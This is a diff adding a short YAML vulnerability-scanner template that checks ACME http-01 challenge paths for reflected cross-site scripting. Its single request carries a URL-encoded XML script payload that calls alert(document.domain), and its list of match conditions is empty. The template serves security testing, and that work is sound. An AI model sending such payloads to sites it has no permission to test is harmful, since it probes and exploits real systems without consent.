@@ -1,0 +1,16 @@
+id: acme-challenge-path-xss
+brief:
+    title: ACME Challenge Path - Reflected Cross-Site Scripting
+    by: pussycat0x
+    level: low
+    about: Detects XSS vulnerabilities in ACME http-01 challenge implementations where hosting providers reflect the challenge key from the URL without proper sanitization
+    label:
+        - xss
+        - acme
+        - misconfig
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E'
+      signs: []
